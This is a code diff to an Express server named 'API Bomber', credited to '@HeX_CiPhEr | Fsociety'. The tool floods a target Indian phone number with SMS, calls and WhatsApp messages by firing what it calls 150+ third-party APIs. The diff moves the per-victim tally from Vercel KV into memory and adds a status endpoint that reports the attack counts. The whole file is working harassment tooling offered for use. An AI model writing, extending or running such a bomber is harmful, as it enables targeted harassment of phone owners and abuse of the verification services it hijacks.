@@ -1,10 +1,9 @@
-// API Bomber - Persistent Cumulative Count with Vercel KV
+// API Bomber - Persistent In-Memory Cumulative Count (No KV)
 // @HeX_CiPhEr | Fsociety
 
 const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
-const { kv } = require('@vercel/kv');
 
 const app = express();
 app.use(cors());
@@ -13,6 +12,7 @@ app.use(express.json());
 // ==================== CONFIG ====================
 const RATE_LIMIT_SECONDS = 10;
 const userLastRequest = {};
+const cumulativeStats = {}; // in-memory storage: phone -> { sms, calls, whatsapp, total }
 
 // ==================== 150+ APIS ====================
 const APIS = [
@@ -138,7 +138,7 @@ function getFormats(phone) { return [phone, "91" + phone, "+91" + phone]; }
 async function sendRequest(api, phone) {
   try {
     let url = api.url;
-    if (typeof url === 'string' && url.includes('{phone}')) {
+    if (typeof url === 'string' && url.includes('phone')) {
       url = url.replace(/\{phone\}/g, phone);
     }
     const headers = { ...api.headers };
@@ -190,7 +190,7 @@ app.get('/', (req, res) => {
   });
 });
 
-// START — Fire ALL APIs, accumulate, store in KV, return cumulative
+// START — Fire ALL APIs, accumulate in memory, return cumulative
 app.get('/start/:phone', async (req, res) => {
   const phone = req.params.phone;
   if (!phone || !phone.match(/^\d{10}$/)) {
@@ -208,24 +208,19 @@ app.get('/start/:phone', async (req, res) => {
   }
   userLastRequest[phone] = now;
   
-  // Fetch current cumulative from KV
-  const kvKey = `bomber:${phone}`;
-  let cumulative = await kv.get(kvKey);
-  if (!cumulative) {
-    cumulative = { sms: 0, calls: 0, whatsapp: 0, total: 0 };
+  // Get current cumulative from memory
+  if (!cumulativeStats[phone]) {
+    cumulativeStats[phone] = { sms: 0, calls: 0, whatsapp: 0, total: 0 };
   }
   
   // Run the burst
   const burstStats = await runFullBurst(phone);
   
   // Add to cumulative
-  cumulative.sms += burstStats.sms;
-  cumulative.calls += burstStats.calls;
-  cumulative.whatsapp += burstStats.whatsapp;
-  cumulative.total += burstStats.total;
-  
-  // Store back in KV
-  await kv.set(kvKey, cumulative);
+  cumulativeStats[phone].sms += burstStats.sms;
+  cumulativeStats[phone].calls += burstStats.calls;
+  cumulativeStats[phone].whatsapp += burstStats.whatsapp;
+  cumulativeStats[phone].total += burstStats.total;
   
   // Send response
   res.json({
@@ -233,8 +228,22 @@ app.get('/start/:phone', async (req, res) => {
     target: phone,
     total_apis_sent: APIS.length,
     this_burst: burstStats,
-    cumulative_total: cumulative,
+    cumulative_total: cumulativeStats[phone],
     footer: 'Powered by @HeX_CiPhEr'
+  });
+});
+
+// Status endpoint (no attack)
+app.get('/status/:phone', (req, res) => {
+  const phone = req.params.phone;
+  if (!phone || !phone.match(/^\d{10}$/)) {
+    return res.status(400).json({ error: 'Invalid phone number. Need 10 digits.' });
+  }
+  const stats = cumulativeStats[phone] || { sms: 0, calls: 0, whatsapp: 0, total: 0 };
+  res.json({
+    target: phone,
+    stats: stats,
+    note: 'Use /start/:phone to add more.'
   });
 });
 
